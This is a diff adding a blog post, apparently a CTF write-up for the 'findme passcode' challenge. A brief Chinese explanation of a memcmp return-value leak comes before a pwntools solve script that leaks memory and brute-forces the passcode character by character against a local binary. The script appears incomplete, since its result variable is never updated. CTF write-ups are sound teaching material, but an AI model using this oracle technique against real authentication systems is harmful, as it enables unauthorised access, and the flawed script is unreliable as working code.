@@ -1,0 +1,52 @@
+---
+layout: post
+title: "isg_findme_passcode"
+date: 2015-10-27 23:52:30 +0800
+comments: true
+categories: 
+---
+###0x00
+
+memcmp会在\x00处或者比较n个字符后停止  
+正常情况memcmp会返回 xx (xx为偏移),但memcmp有时候会返回 00xx (xx为偏移)  
+为\x00时输出found  ,第二种情况
+为\xff输出found，输出i+1  
+
+
+###0x01 sol.py
+
+    from pwn import *
+    from string import *
+    
+    p = process('./findme2')
+    
+    payload = ['4' for i in range(0x15)]
+    p.recvuntil('op:')
+    p.sendline('3')
+    p.recvuntil('code:')
+    p.sendline(''.join(payload)  + 'end')
+    print (''.join(payload)  + 'end')
+    p.recvuntil('end')
+    data = p.recv(4)
+    log.success(hex(u32(data)))
+    
+    res = ''
+    for i in printable[:-6]:
+        p.recvuntil('op')
+    	p.sendline('33')
+    	p.recvuntil('code:\n')
+    
+    	payload = res + i 
+    	payload = payload.ljust(0x17, '*')
+    	payload += '@'
+    	p.sendline(payload)
+    	data = p.recvuntil(' is ')
+    	t = data[-8:-4]
+    	print t+'-------------------------------'+i
+    	index = data.find('@')
+    	if data[index+1:index+2] == ' ':
+    		log.success(' found' + '------------------' + i)
+    	if data[index+1:index+2] == '\xff':
+    		log.debug('ff found' + '------------------' + chr(ord(i)+1))
+    log.info('passcode: '+res)
+    p.interactive()
